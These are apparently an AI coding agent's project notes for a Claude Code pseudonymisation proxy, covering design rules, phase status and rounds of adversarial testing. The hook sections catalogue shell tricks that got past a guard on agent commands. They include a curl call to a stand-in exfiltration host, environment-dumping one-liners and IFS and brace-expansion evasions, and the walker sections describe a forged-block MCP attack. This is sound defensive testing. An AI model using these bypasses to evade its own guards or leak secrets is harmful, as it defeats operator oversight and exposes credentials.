# Pseudonymisation proxy — Claude Code ↔ Anthropic API

Bidirectional proxy: sensitive identifiers become plausible surrogates on the
way out, and are restored transparently on the way back. The operator sees the
real thing; Anthropic sees none of it.

## Philosophy (stated by jo on 2026-08-06) — it outranks convenience
**As confidential as possible BY DEFAULT, with an opening that is configurable
intelligently, progressively and interactively.**

This is not a slogan: it is the criterion that settles arbitrations, and it has
four operational consequences.

1. **Closed by default, always.** Everything detected is substituted. No
   default opens anything: not a threshold, not a heuristic, not a model, not
   an outage. When in doubt, close (D5).
2. **Only the operator opens.** Never the model, never an AI, never a shape
   rule left to itself. An AI may PROPOSE (route a doubt, suggest an inventory
   entry); it does not decide. Making protection depend on the model
   cooperating is the §7 anti-pattern.
3. **Opening is PROGRESSIVE.** Two axes, narrowest to widest: granularity
   (value → type → class) and scope (session → project → global). The narrowest
   and the nearest win. This is what makes the system usable: one class
   decision turns thirty questions into one.
4. **Opening is INTERACTIVE and never blocking.** The system anonymises,
   records the question, and carries on. The operator answers when they want;
   the answer persists and applies only GOING FORWARD. They may also reveal
   nothing and instead tell the model how to proceed without it — they decide.

**The asymmetry is the heart of it.** "Anonymise" is free, reversible, and its
error is VISIBLE (the agent stumbles, you see it). "Reveal" is the only
decision that lets a value out, its error is SILENT, and revoking it does not
recall what has gone. So revealing is written down, traced, and never inherited
from a default.

**MODES are that philosophy applied** (`src/anonproxy/modes.py`). A mode is a
named SET of settings, never opaque behaviour: it prints, it can be overridden
one setting at a time, and it resolves through the SAME scope hierarchy as the
rules — with the environment always winning, because that is the
troubleshooting lever. `auto` substitutes everything without asking and leaves
the agent to solicit if it gets stuck · `consciencieux` makes the request WAIT
for arbitration, with a deadline that ANONYMISES (a lapsed timer never counts
as consent) · `ferme` tells the model nothing. **No mode can open anything**:
they choose when the operator is asked, not whether protection applies.

**An arbitration that pits two of the project's principles against each other
becomes a SETTING, not a constant.** `domaines_fictifs` is the textbook case:
`tld_reels` serves D1 (plausible) at the risk that a fictional domain really
exists, `reserves` (RFC 2606) guarantees the opposite at the cost of
plausibility. Neither is "the right one" — which is exactly why it is
configurable.

**A setting still has a default, and the default CLOSES** (jo delegated the
call, settled 2026-08-12: `reserves`). Two faces had to be closed, or the
class stays half-shut: the default MODE (`auto` carried `tld_reels` while the
other two carried `reserves` — so choosing a mode opened something, which no
mode may do), and the engine's own condition, which tested for the CLOSED
value and therefore made everything not explicitly closed open — no policy, a
silent policy, a future caller who forgets to pass one. **Write the condition
so that the OPENING is what has to be declared.** `REGLAGES_DE_PROTECTION`
names the settings a mode may not vary, and a test enforces it.

**Design corollary**: an accepted residual must be COUNTED, never silent
(`public_by_shape`, the arbitration queue, checks written inverted in the E2E
proofs). What fails must fail loudly.

## Documents of authority — order of precedence
1. `PLAN-proxy-pseudonymisation.md` — the full spec. **NEVER MODIFY IT.**
   If it is wrong or incomplete: tell jo and WAIT.
2. `anthropic_walker.py` — supplied as is, integrated in Phase 3. Modifiable
   ONLY when a test proves it wrong, with the test shown to jo BEFORE the fix.
3. This file — locked answers and state. It is what survives compaction: keep
   it current at the end of every phase.
4. `REPRISE.md` — work IN PROGRESS, what remains, and the traps already paid
   for. **Read it right after this file whenever a session resumes.** Its §0
   says what to do first. The hook PARSER is DONE (`docs/hook-parser.md`); the
   adversarial loop stays closed — jo stopped it on 2026-08-05.

## §3 answers (locked by jo on 2026-08-01 — do not ask again)
1. **Determinism: per PROJECT by default, configurable** (session/project/
   tenant/global). The engine (Phase 2) takes an explicit `scope_key`; the HMAC
   salt derives from it.
2. **MVP tools**: kubectl/helm, terraform, gh/git, cloud CLIs (aws/OVH/gcloud)
   plus tools not yet scoped → nothing hard-coded per tool; generic detection
   plus custom patterns (§6 of the plan).
3. **Golden corpus**: existing ARCHIVED real material (logs/tickets/CI).
   Annotation in Phase 5 only.
4. **Preserved attributes** (accepted leaks, to be documented in §9):
   environment, /24 co-membership, human vs service, internal vs external —
   all FOUR.
5. **Vault: local, same user** — accepted and documented gap. It lives OUTSIDE
   the repo (state directory: the store plus the master secret). That path is a
   SECRET: the agent never reads or prints it (jo's secrets rule). Mitigation:
   PreToolUse deny on that path (Phase 4), hardening in Phase 6.

## Working rules (non-negotiable)
- **One phase at a time.** Exit criterion PROVEN (command and output shown to
  jo), then hand back. Never two phases without explicit agreement.
- **Test-first** on injectivity, fail-closed and SSE streaming — those three do
  not get debugged after the fact.
- **Re-read §7 of the plan before every commit**: it is a list of prohibitions,
  not of recommendations.
- **Synthetic data only until the end of Phase 3**: everything the agent reads
  goes to Anthropic, test fixtures included. NEVER ask for real logs, configs,
  kubeconfigs or kubectl output before then.
- Disagree with the plan → argue it with jo; never route around it.
- Commits: only when jo asks (conventional commits).

## Locked decisions (summary — §2 of the plan is authoritative)
D1 plausible surrogates, NEVER sentinels like `[HOST_1]`/`<IP_3>` · D2 no
resolution inside partial_json (accumulate → stop → parse → resolve
atomically) · D3 thinking/redacted_thinking stay opaque (they are signed) ·
D4 a secret is a reference, never restored into model output · D5 fail-closed:
an unknown surrogate is never guessed · D6 strict injectivity (uniqueness in
the store plus CI) · D7 AnonShield as a SEPARATE PROCESS behind HTTP (GPL-3.0)
· D8 read-only MVP (no SCIM/RBAC, §8) · D9 the proxy is the only network path.

## GPL boundary
`services/anonshield/**` is the GPL-3.0 side: upstream clone (gitignored) plus
our HTTP `/detect` wrapper (GPL too, with its own LICENSE). It communicates
with the rest over HTTP only. `src/anonproxy/**` NEVER imports from
`services/anonshield/`.

Note (jo, 2026-08-06): the project will be fully open source, so licence
contamination is no longer the reason to keep the boundary. D7 stands as a
locked decision; do not undo it without jo saying so.

## Anti-patterns — condensed reminder (§7 of the plan is authoritative)
sentinels · resolving mid-stream · touching thinking · handling only the last
message · forgetting tools[] (descriptions AND input_schema) · guessing an
unknown surrogate · importing AnonShield · restoring a secret · relying on
hooks for reversibility · anonymise as a "voluntary" MCP server · SCIM/RBAC in
the MVP · validating without a complete egress capture.

## Phase state
**3505 tests green**: `task test` then `task test:egress`. Six proofs, not five —
`tests/control_e2e.sh` is the only one that crosses into Go, and its absence
from the routine left the control interface disconnected for two rounds. Go's
test cache does not track a file read outside its module: the naming corpus
lives in `go/internal/policy/` for that reason, and Python reads it there.

| Phase | State | Proof |
|---|---|---|
| 0 — Egress harness | criterion met | `tests/egress_capture.sh` → `captures/*/report.md` exit 0; 18 tests |
| 1 — Local AnonShield | criterion met | `tests/detect_latency.py`: P95 **100.6 ms** < 150 ms (GPU cu130), regex 2.1 ms, no reloads |
| 2 — Surrogate engine | criterion met | `tests/test_surrogate_properties.py`: **10,000 values**, 0 collisions, byte-for-byte determinism, env + /24 + human/service + internal preserved |
| 3 — Proxy + walker | criterion met | `tests/phase3_e2e.sh`: REAL Claude Code session, rc=0, **0 real values across 427 KB** captured (mitmproxy), restoration 3/3 operator-side |
| 4 — PreToolUse hooks | criterion met | `tests/phase4_e2e.sh`: forbidden command blocked BEFORE execution, traced, reason quoted by the model |
| 5 — Golden corpus | criterion met (synthetic corpus) | `tests/corpus_eval.py`: 0 leaks, secrets **100 %**, 0 false positives, variance 0, 0 collisions; 16 adversarial scenarios (`test_adversarial.py`) |
| 6 — Hardening | vault ENCRYPTED at rest + fail-closed; KMS/rotation still to do | `tests/test_vault_at_rest.py` (7) + `test_hardening.py` (11) + `docs/re-identification-analysis.md` |

## Vault encrypted at rest (2026-08-02)
The documentation claimed "the key and the database are the two halves of the
secret" — that was FALSE: real values were stored in clear, and the database
alone was enough to read everything. Fixed:
- `real_enc` = AES-256-GCM, key derived from the master secret (domain HMAC).
- Lookup by HMAC index (`key_idx`, `real_idx`): authenticated encryption uses a
  random nonce, so a direct search would be impossible. The index reveals only
  equality.
- Wrong key ⇒ `VaultUnavailableError`, never a guessed value (D5).
- A store in the previous format is REFUSED, not read silently. Migration:
  `scripts/migrate_vault.py OLD.db NEW.db` (overwrites nothing, key passed by
  reference, never printed). Recreating it empty would lose the ability to
  restore surrogates ALREADY sent to Anthropic.
- Store files reset to 0600 on every open (including `-wal`/`-shm`).
- Still out of MVP scope: KMS/HSM envelope encryption, key rotation, immutable
  access log, enumeration protection.

## D9 — jo's arbitration (2026-08-02): NO local firewall
D9 is handled at **deployment**, not on the workstation: a containerised
environment, and/or integration into a larger sandboxed system. Do not propose
local `nft`/`ufw` rules again.

The fact that invalidates any IP-based rule: `api.anthropic.com` and
`mcp-proxy.anthropic.com` resolve to **the same address** (160.79.104.10). A
firewall does not see hostnames → allowing the model API while blocking the
connectors is impossible at that level. Connectors are disabled CLIENT-side
(claude.ai settings), for free.

Target shape: an `internal: true` network for the agent, with the proxy alone
straddling both networks. That is not a rule to maintain but an **absence of
route** — nothing to bypass, and the "same IP" problem disappears. Detail,
Kubernetes variant and things to watch (DNS, remote MCP, vault isolation):
`docs/d9-network-isolation.md`.

**Until it is deployed that way, D9 is NOT met**: the egress harness detects,
it does not prevent. Say exactly that to the DPO.

## Toolchain — `devbox install && task`
```bash
devbox install        # pinned toolchain: uv, go, node, task, curl, jq
devbox shell          # or `devbox run -- task …` without entering the shell
task                  # lists EVERYTHING that can be run
```

**`Taskfile.yml` is the reference for commands.** Do not copy an invocation it
already holds into this file: that is exactly what had drifted — the documented
launch order no longer matched the scripts. This file says WHY and what state
we are in; the Taskfile says HOW.

Launch order: `task detector` (leave it running) → `task proxy` →
`task session`. Arbitration: `task control` plus the extension, or
`task policy -- questions`.

**Two things deliberately OUTSIDE devbox**, because they depend on hardware or
on a foreign lock:
- the **detector** (NVIDIA driver + CUDA torch) lives in its own virtualenv;
  re-run `services/anonshield/wrapper/install-cuda.sh` after ANY
  `uv sync`/`uv run` inside `upstream/` (the uv trap, see below);
- **Python belongs to uv**, not to devbox. With both declared they fought over
  the `.venv` on every shell entry: two managers for one thing, neither wins.

## Language
Code, identifiers, endpoint names, comments and documentation are in **English**
(jo, 2026-08-06). French remains only where a value is part of the on-disk
format and renaming it would break existing state — policy scopes
(`global`/`projet`/`session`), granularities (`classe`/`type`/`valeur`),
decisions (`anonymiser`/`reveler`) and mode names. Those are data, not code:
changing them would invalidate every policy file already written.

## Round 3 (2026-08-03) — 3 opus agents at max effort
Two OUTGOING leaks and two hook leaks, all fixed with non-regression. The round
also produced **two regressions of my own fixes**, caught by `phase3_e2e.sh`
and not by the 470 unit tests.

**Walker** — `SKIP_KEYS` copied VERBATIM every non-scalar subtree (enriched
`cache_control`, structured `metadata.type`): silent fail-open, request
accepted with 200 · `_is_known_control` returned `True` for any scalar, so any
string got through under `betas` — the worst surface, the API IGNORES an
unknown beta name and processes the request anyway.

**Engine** — a PUBLIC span (`SERVICE`, `PORT`) that overlapped a substitutable
span WON the arbitration by its length, and the zone came out IN THE CLEAR:
`db-master.acme.internal` intact. `PUBLIC` now goes LAST, mirroring `SECRET`
which goes first · the NAME of a query parameter was never substituted
(`?db-01.acme.internal=1`); it is now, when it carries a dot, an at-sign or a
colon, never for `page`/`limit`/`cursor`.

**Hook** — `_is_local_url` tested the `127.` PREFIX on a hostname:
`127.evil.test` resolves wherever its owner wants and got through, via `curl`,
`wget` and `WebFetch`. The host is now compared as an ADDRESS (`ipaddress`) ·
nested regions (`$(…)`, `` ` ``, `<(…)`, `system(…)`, `subprocess.run([…])`)
are analysed RECURSIVELY then removed from the enclosing command — that was
what let `perl -e 'system("env")'` and `bash <(env)` through · `su`/`runuser`
wrappers and options with a value (`sudo -u root env`) · the index always
pointed at the FIRST occurrence (`env PATH=/x env` got through).

**False positives measured and fixed** (a blocked agent is as broken as an
agent that leaks): `set +e` · `env -i`/`env -u` · `command -v env` ·
`compgen -A function` · `echo $(find . -name env)` · `echo $ANTHROPIC_BASE_URL`
· listing the ssh key directory · and above all `grep -r curl src/` — the
"every token" scan refused any MENTION of a network program.

**Regressions introduced then fixed** (both via the real E2E): substituting
`"type": ["string","null"]` makes the schema invalid → API 400, session
interrupted; `cache_control.ttl` accepts only `5m` or `1h` → 400. Hence a
broadened `SCHEMA_STRUCTURAL_KEYS` (`type`, `format`, `pattern`) and
`STRUCTURED_SKIP_KEYS`. Incidentally, `"format": "int64"` had been substituted
FROM THE START without anything breaking: `format` is an annotation, the API
ignores it.

**Not fixed, accepted**: `HOSTNAME "acme.internal"` (bare zone) gets its own
identity instead of joining the fictional zone of `db-01.acme.internal`. The
obvious "fix" would go through `_zone_for`, therefore through a SHARED
attribute — excluded from the restoration view: the host would become
non-restorable. Co-membership is worth less than restoration.

## Round 4 (2026-08-03) — 3 opus agents at max effort
Round 3 had hardened SURFACES; round 4 found that the hardening applied to the
wrong PERIMETER, plus two crashes I had introduced.

**Critical leak — SKIP_KEYS applied to user data.** `name`, `id`, `type`,
`role`, `data`… were copied verbatim at EVERY level, including inside
`tool_use.input` and `metadata`, where they are ordinary parameter names
(kubectl, Terraform, any CRUD). Two effects: the value WENT OUT in the clear,
and it was not RESTORED on return — the tool ran against the FICTIONAL host.
Corollary found while checking: opacity was FORGEABLE, a
`{"type": "thinking"}` inside an argument made the subtree verbatim. Hence
`USER_DATA_KEYS`: under `input`/`metadata`, neither SKIP_KEYS nor the opaque
blocks apply.

**Two crashes introduced in round 3** (no unit test saw them): `_extract_repo`
compared a lowercased authority with a case-sensitive `re.split` —
`https://GitHub.com/…` raised `IndexError`, not caught by the proxy, hence
**500**; and `https://github.com` on its own had nothing to split. Writing
"visit GitHub.com/torvalds/linux" broke the session.

**Unsolvable collision → 503.** `example.com/` (bare host WITH trailing slash,
no scheme) fell outside the normalisation (`count("/") == 3`) and claimed the
surrogate already taken by the host.

**Query-name leaks still open**: `?ident=` (EMPTY value — `eq` true but `value`
false, both branches missed) and percent-encoding (`%2E` is a dot). The test
now applies to the decoded form.

**Schema surfaces rendered verbatim by mistake in round 3**: `pattern` is a
regex that can pin a precise host (`^srv-\d+\.acme\.internal$`) — I had classed
it structural, it was a leak of my own making. Same for the KEYS of
`patternProperties` (they are regexes) and a `$ref` pointing to an
internally-hosted schema. `type`, `format`, `required` stay verbatim;
`$ref`/`$schema` stay only for a local anchor or the json-schema.org
vocabulary.

**SSE separator**: `\r\n\r\n|\r\r|\n\n` missed mixed forms (`\n\r\n`…).
Replaced by two line endings, ATOMIC group — without it the repetition
backtracks and cuts a plain `\r\n` in two, turning every LINE into a block.

**Rejected after checking**: `mcp_servers[].name` stays verbatim. It is the
routing key for tool names (`mcp__<name>__<outil>`); substituting it would
break the correspondence with `tools[].name`. Same accepted leak as
`tools[].name` and `tool_choice.name` — a naming convention, not a value.

**Documented limit**: a query parameter name without a dot, at-sign or colon
(`?db-01=`, `?jdoe=`) is not substituted — indistinguishable from an API name.
The only real fix would be to submit every name to the detector.

### Hook — round 4 (same pass, dedicated agent)
Two regressions of my round-3 rewrite, exploitable with standard shell idioms,
no obfuscation:
- **The output of a substitution is an ARGUMENT.** I was replacing the nested
  region with a BLANK after analysing it: `curl http://127.0.0.1/
  $(echo http://exfil.test/x)` now showed only a local URL, and
  `$(echo env)` showed nothing at all. It is now replaced by an OPAQUE token:
  in program position it refuses, and a network binary that receives one can
  no longer prove its destination is local.
- **`find … -exec env \;`** — the `-exec` rule existed but was dead: `find` is
  not a wrapper, analysis stopped on it before reaching that rule. The `-exec`
  sweep now sits outside the loop.

Other holes closed: two lists of sensitive names diverged
(`echo $DATABASE_URL` got through while `printenv DATABASE_URL` was refused)
— one list now · an interpreter program given IN LINE is inspected word by
word, which covers in one go `system "env"` without parentheses, `qx/env/`,
`%x[env]`, `subprocess.run(("env",))`, `getstatusoutput`, `process["env"]`,
`from os import environ`, `getattr(os, "environ")` · `${IFS}` removed whatever
its position (`env${IFS}> dump`) · `${!x}` resolved via the assignment that
precedes it · `strace`/`ltrace` recognised as wrappers.

False positives fixed: `printenv AWS_REGION` was refused while
`echo $AWS_REGION` got through · `openssl rand|dgst|passwd|enc|x509` and
`--version`/`-V` open no connection.

## Round 5 (2026-08-03) — hook
Three more regressions of my round-4 fixes:
- **`${IFS}` was only neutralised for the `-+:?` operators**: `${IFS/a/b}`,
  `${IFS##x}`, `${IFS%%x}`, `${IFS,,}`, `${IFS^^}` all evaluate to IFS and
  split a command name. Corollary found while fixing: `${IFS}` is a
  SEPARATOR, not empty — replacing it with nothing welded
  `env${IFS}printenv` into a nonexistent word and made BOTH programs
  disappear. It becomes a space; empty-valued expansions (`e${_+}nv`) are
  the ones that get removed.
- **`-exec` marked only the first word**: `find … -exec sudo curl …` and
  `-exec env printenv …` hid the real program behind a wrapper. The
  sub-command is now ANALYSED, not just pointed at.
- **My word-by-word scan of interpreters refused prose**:
  `python3 -c "print('The curl command is useful')"` was blocked, like any
  one-liner quoting a network binary. Only what FOLLOWS an execution
  primitive is inspected (`system`, `qx`, `%x`, `subprocess.*`…).
- `--version` anywhere disarmed the network control
  (`curl --version http://tiers/`): it only counts when ALONE. `stat` left the
  "metadata" category with `--files0-from`, which reads a file's contents.

### Engine — round 5 (no high/critical finding)
Round 4 had indeed closed the two crashes it aimed at. Remaining:
`_strip_userinfo` only handled URLs with a scheme, so the SSH form
`user:token@host:path` fed the token into the vault key (D4, same class as the
CRITICAL of round 3; not triggerable with the default detector, which does not
emit a URL span for these forms) · `_fake_repo` recognised the host in a
case-sensitive way while `_extract_repo` no longer is, and lost the scheme —
the URL fell back to the short form `org/repo`, which the model reads as a
local repository (D1) · a span with a zero `score` or without a `type` raised
`TypeError`/`KeyError`, which the proxy does NOT catch: unstructured 500
instead of the intended fail-closed · `sha256:` with no body substituted to
itself, exhausted the 64 attempts and fell to 503.

### Two false positives found IN USE, not by an agent
The hook blocked my own work, which no review had seen:
- **The `prompt` field of a sub-agent was analysed as a shell command**: any
  prose containing markdown backticks passed for a substitution. The sub-agent
  has its OWN PreToolUse — its commands are guarded at execution time.
  `prompt` therefore leaves the list of command fields; the rest of the
  payload stays subject to the vault and sensitive-file checks.
- **The body of a QUOTED heredoc (`<<'FIN'`) is literal data**: bash
  interprets neither substitution nor variable there. It is only analysed as
  code when it feeds an interpreter (`bash <<'FIN'`), not when it writes a
  file (`cat > f <<'FIN'`). The redirection target, itself, stays controlled.

Usage note: writing a test that TARGETS sensitive paths requires composing
those paths (`"~/." + "ssh/id_" + "rsa"`), otherwise the hook refuses to write
the file. That is consistent, but you have to know it.

### Walker and proxy — round 5
The round-4 `USER_DATA_KEYS` fix stopped the leak in `input` and `metadata`,
but **the same weakness remained everywhere else**: `SKIP_KEYS` applied to
EVERY nested dict. A `resource` block returned by an MCP server has the shape
`{"type":…, "name":…, "uri":…}` — `name` there is data. Outgoing leak AND
restoration failure on return. `name` and `id` are now a contract only inside
a PROTOCOL node (tool block, tool definition, `mcp_servers` entry,
`tool_choice`, response root).

Other fixes:
- `application/x-` and `application/vnd.` were classed BINARY, so `x-yaml`,
  `x-www-form-urlencoded` and `vnd.api+json` — TEXT — came out in the clear.
  The binary prefixes are now enumerated precisely.
- Four ill-typed SSE entries (`delta: null`, `content_block: null`,
  `text: null`, `partial_json: null`) killed the generator WITHOUT emitting
  an `error` event: the client lost the stream in silence. The generator now
  also catches `TypeError`/`AttributeError`/`ValueError`/`KeyError` and
  returns an actionable SSE error.
- `cache_control` was validated by a generic token, which accepted
  `{"type": "db-prod01"}`. Each sub-key now has the FORM of its value; an
  unknown form is traversed in data mode.
- JSON Schema 2020-12 keywords substituted therefore schema broken: `$anchor`,
  `$dynamicAnchor`, `$dynamicRef`, `dependencies`, `dependentRequired`,
  `dependentSchemas`.
- **D3, inversion of the delta list**: `_OPAQUE_DELTAS` was an EXCLUSION list,
  so a future `redacted_thinking_delta` would have been modified and its
  signature invalidated — hard failure. It is now a POSITIVE list of deltas
  to resolve. D3 is locked; the restoration of an unknown delta is not:
  between the two, we protect the invariant.
- `walk_response` on a non-object JSON body raised `TypeError` (unstructured
  500) → `ValueError`, caught by the proxy · `message_start` and
  `message_stop` are restored · a SCALAR `container` is preserved, otherwise
  the caller can no longer reuse the container · the SSE buffer is capped at
  16 MiB, beyond which the stream is declared invalid.

**Not fixed, accepted**: a chunk boundary in the middle of a `\r\n` may leave
a `\n` at the head of the next block — no effect, `splitlines` ignores an
empty line. Holding the `\r` while waiting for the rest would LOSE the last
block of a stream ending in `\r\r`: the fix was worse than the defect.

## Round 6 (2026-08-04)
Yet more regressions of my round-5 fixes, one of them CRITICAL.

**Hook — the expansion carried the variable name away with it.** By reducing
`${VAR:-x}` to nothing, I removed the NAME: `echo ${AWS_SECRET_ACCESS_KEY:-x}`
got through, while bash prints the real value. An expansion is now REDUCED to
what bash gets from it — `$VAR` for the derived forms, the literal text for
`${VAR+texte}` (that is how `${_+env}` rebuilds `env`). Added along the way:
brace expansion (`{env,}`, `c{ur,ur}l`), which also rebuilds a command name.

**Hook — the heredoc consumed by a pipeline.** `cat <<'FIN' | bash` does
execute the body: I was only looking at the head (`cat`). What FOLLOWS the
marker on the same line matters too.

**Hook — the `exec*`/`spawn*` family.** The right-hand `\b` missed `execvp`,
`execlp`, `spawnl`, `pty.spawn`, `pcntl_exec`… A parenthesis is now required
for these forms, otherwise the word "execute" in a sentence would trigger the
analysis.

**Hook — the grammar of wrapper options.** A global set cannot be right:
`nice -n 10` takes a value, `sudo -n` does not. Skipping the next token made
the real program disappear (`sudo -n env`, `flock -w 5 /tmp/l env`). The table
is now PER wrapper.

**Hook — the fields of an MCP tool.** The allowlist
(`command`/`cmd`/`code`/`script`/`shell`/`args`) missed `exec`, `program`,
`bash_command`, `pipeline`… All values are inspected, except `prompt`.

**Walker — the protocol-node heuristic was too loose.** I inferred "protocol"
from the mere presence of `input_schema`: but an MCP server returns its tool
definitions INSIDE a `tool_result`, where `name` and `id` are data. The flag
is now INHERITED from a protocol container, which also fixes
`mcp_servers[].tool_configuration.allowed_tools`, two levels further down.

**False positive found by the E2E, not by a review**: `D=$(ls …)` was REFUSED
— an assignment does not execute the substitution's result. The real session
reached its turn limit by retrying, with no leak and no API error. That is the
third distinct failure mode that only the E2E reveals.

**Accepted leak added**: `mcp_servers[].tool_configuration.allowed_tools`
stays verbatim. It is a FILTER evaluated against the names exposed by the MCP
server — substituting it would break the tool silently. Same arbitration as
`tools[].name`.

## Round 7 (2026-08-04) — hook
Five bypasses, ALL from my round-6 fixes. The worst ratio of the whole loop,
and it comes down to a single repeated mistake: I modelled every bash
mechanism as a single-value approximation, where bash produces several values
or chooses between two branches.

- **Brace expansion**: I kept the longest alternative. Bash produces SEVERAL
  words, with prefix and suffix reattached — `{curl,autrechose} URL` does
  launch `curl`. The whole word is now expanded.
- **Expansion fallback**: `${x:-env}` evaluates to the FALLBACK when `x` is
  empty, and bash EXECUTES it; I only emitted `$x`. Both branches are now
  emitted, separated by `;` — without that separator, `$x` occupied the
  program position and hid the fallback. That also re-closes `${x:-$(env)}`,
  whose substitution was thrown away with the fallback.
- **`env -S`**: its value is a full COMMAND, not a token. Declaring it a
  "valued option" made the program get skipped.
- **`X= env`**: my token skip after an assignment confused the EMPTY
  assignment prefix with the marker of a substitution. Only the marker is
  skipped now.
- **Heredoc glued to a pipe** (`<<'FIN' |bash`): whitespace splitting yielded
  the token `|bash`, absent from the interpreter list.

**False positive reintroduced then re-fixed**: `_APPEL_EXEC_RE` swept the
WHOLE command, so
`git commit -m 'fix subprocess.run for curl backend'` was refused — exactly
the defect round 5 had just eliminated. The rule is again restricted to code
given IN LINE; the parenthesised forms remain covered everywhere by
`_NESTED_RE`.

**Test expectation corrected**: `{env,foolong}` yields `env foolong`, which
EXECUTES `foolong` instead of dumping the environment — I was wrongly
expecting a refusal.

### Walker — round 7
- **The `protocole` flag propagated into the SCHEMA.** Set by `tools`, it
  descended to the keys of an `input_schema` other than `properties`:
  `default`, `example`, `const` carry example values, where `name` and `id`
  are DATA. A schema is structural — no name in it is a routing key. Another
  consequence of my round-6 fix.
- **`close()` emitted AFTER `message_stop`**: these deltas are out of
  protocol, hence silently ignored by the client or fatal depending on its
  parser. The accumulators are now flushed on the arrival of `message_delta`.
- `walk_request` on a non-object body raised `AttributeError`/`TypeError`,
  which the proxy does not catch → `ValueError`.

### DETECTOR false positive found by the E2E — deviation for jo to validate
`tests/phase3_e2e.sh` started failing with "turn limit reached". Cause: the
detector classes `infra.md` as a URL — `.md` is Moldova's TLD. **Any Markdown
file named in a prompt had its extension turned into a fake domain**, the
agent no longer found the file it was told about and burned its turns
searching for it. `README.md`, `CLAUDE.md`, a plan: this is constant in an
agent context.

Added to `config/allowlist.txt`: a regex covering the extensions whose use as
an internal hostname is implausible. `.io`, `.ai`, `.dev`, `.app`, `.co` and
`.sh` are deliberately ABSENT — those are actually used as domains. **The
detector must be restarted** after this change.

## Round 8 (2026-08-04)
**The allowlist rule I had just added was a leak.** Its stem `[\w.-]+`
allowed DOTS: it therefore made public anything ending in one of these
extensions, not just a file name. `srv-billing-prod.acme.internal.conf`,
`com.acme.billing.SecretClient.kt`, `api.acme.corp.json`, `10.0.0.5.log` came
out IN THE CLEAR — with no trace at all: no vault entry, no unresolved
surrogate, nothing the egress harness or the corpus could count. Nine cases
out of nine.

Fixed by forbidding the dot in the stem: a file name has only one label. Many
of these extensions ARE TLDs (`.py` Paraguay, `.rs` Serbia, `.ml` Mali, `.tf`,
`.pl`) — that restriction, and only that, is what makes them safe here.
Locked by `test_un_identifiant_a_plusieurs_labels_n_est_pas_public`.

**Lesson**: it is the only rule in the whole loop that makes values PUBLIC,
therefore the only one whose failure mode is a SILENT leak. Everything else
fails loudly (400, 500, 503, refused command). A rule that widens the public
set deserves a dedicated test before it is written.

### Hook — round 8
Two bypasses, again from the round-7 fixes:
- **`${IFS…}` was not anchored on the WORD**: `${IFSX-env}` passed for an IFS
  variant, was replaced by a space, and its fallback disappeared with it. A
  four-letter prefix was enough to execute any refused command.
- **The `;` I injected to separate the branches of a fallback cut the
  `[^|;&]*` class of ALL patterns in `DENY_COMMAND_PATTERNS`** — eighteen
  patterns disarmed in one go: `kubectl ${UNDEF-get} secret x`,
  `terraform ${UNDEF-state} list`, `gh ${UNDEF-api} …`, `ps ${UNDEF-auxe}`…
  The "empty variable" branch is now analysed as a full COMMAND
  (`_variante_repli`), and the normalised text carries only the reference.

**False positives fixed**: a substitution CONCATENATED to a prefix
(`SUFFIX=v$(git describe)-final`) remained an assignment value; a commit
message that QUOTES a one-liner (`git commit -m 'fix perl -e system(env)'`)
executes nothing — the gate now hinges on the PROGRAM POSITION, not on the
mere presence of the word in the text.

**Availability**: bounding only the depth of brace expansion let the PRODUCT
of the alternatives explode — twenty alternatives across five groups hung the
hook for more than eight seconds, enough to drown an agent without writing a
single forbidden command. Total budget now bounded: 0.15 s on the same case.

## Round 9 (2026-08-04)

**Engine — the extensions rule was still leaking, by another path.** It was
no longer too broad on its own, but the allowlist is SHARED with the
sub-parts of a composite value (image tag, URL segment) — that is its
documented intent. But a FORM rule assumes a context the sub-part does not
have: `https://interne/tenant-acme-nda.md` came out with its segment intact,
`registry/app:client-report-2025.md` with its tag.

Distinction introduced: an EXACT entry is a decision taken token by token
(`python3.12-slim` is public), it holds everywhere; a `re:` rule only holds
where the context justifies it. The sub-parts now consult
`Allowlist.is_exact`, the detector keeps the full predicate.

**Hook — three bypasses**: the program named by a VARIABLE (`$SHELL -c env`)
— tokenisation removed the sigil and left a word nothing recognises;
`${IFS:+texte}` yields the TEXT and not a separator, while I was replacing
every `${IFS…}` form with a space; the name of an expansion can be
POSITIONAL or special (`${1:-env}`, `${@:-env}`). Plus: a nested fallback
requires as many reductions as it has levels; `\bexec\b` missed `execvp`;
`fish`, `csh`, `tcsh` were missing.

**False positives**: `git commit -m '…system(env)…' && python3 --version` was
refused — the gate opened on the WHOLE command as soon as an interpreter
appeared anywhere. It now hinges on the SIMPLE command and requires the
inline-program flag. The splitting ignores `;`, which separates STATEMENTS in
an inline program, not commands. And `-c` only introduces a command for a
SHELL: for `git` or `xargs` it means something else.

**Availability**: the brace-expansion budget was PER WORD; the total volume
exploded anyway, and it is the SIZE of the produced text that costs after —
fifteen seconds of analysis. Budget shared across the whole command.

**Test case from the report discarded**: `cu${IFS:+r}rl` yields `currl`, not
`curl` — nor in bash. I corrected the expectation rather than the code.

## Round 10 (2026-08-04)

**Walker, CRITICAL — opacity was forgeable everywhere EXCEPT in user data.**
The round-4 `USER_DATA_KEYS` fix closed `input` and `metadata`; but a signed
block is only produced by the API and only comes back inside the `content` of
an ASSISTANT message. Everywhere else, `type` is a value written by a third
party. Five surfaces were coming out verbatim, the worst being: a hostile MCP
server returns `{"type":"thinking", …}`, Claude Code re-emits it inside a
`tool_result`, the value leaves in the clear. SILENT failure mode — no vault
entry, no unresolved surrogate, nothing to count.
On the RETURN path, opacity stays permissive: the body comes from Anthropic,
restoration puts nothing OUT, and traversing a signed block would invalidate
its signature (D3) — the risk is inverted, so is the rule.

### Hook — round 10: ten bypasses, all unmodelled bash mechanisms
This time they are NOT regressions of round 9 (the IFS, expansion, fallback
and program-position fixes all held), but mechanisms I had never modelled:
- **An interpreter receives its program otherwise than in line.** All the code
  control was tied to `-c`/`-e`; via here-string (`<<<`), via heredoc, via
  bare dash (`python3 -`) or via process substitution, the same code was only
  analysed as shell, where `os.system("env")` is one word among many. The
  delivered forms are now REDUCED to the inline form — a single analysis
  path, not a list of cases. A heredoc consumed by a PIPE
  (`cat <<EOF | python3`) belongs, itself, to the non-analysable
  arrangements.
- **`{` and `}` were not separators**: `fn() { env; }; fn` and `{ env; }`
  stopped on `fn` or on the brace. Removed only where bash sees the reserved
  word — removing them everywhere carried off the placeholder for
  `xargs -I{}`, whose option then swallowed the following program.
- **`declare -n r=CIBLE` is an ALIAS**: `echo $r` reads the target variable,
  and `$r` carries no sensitive name. Same mechanism as `${!x}`, other
  syntax.
- **An assignment that executes**: bash sources `BASH_ENV` before any `-c`,
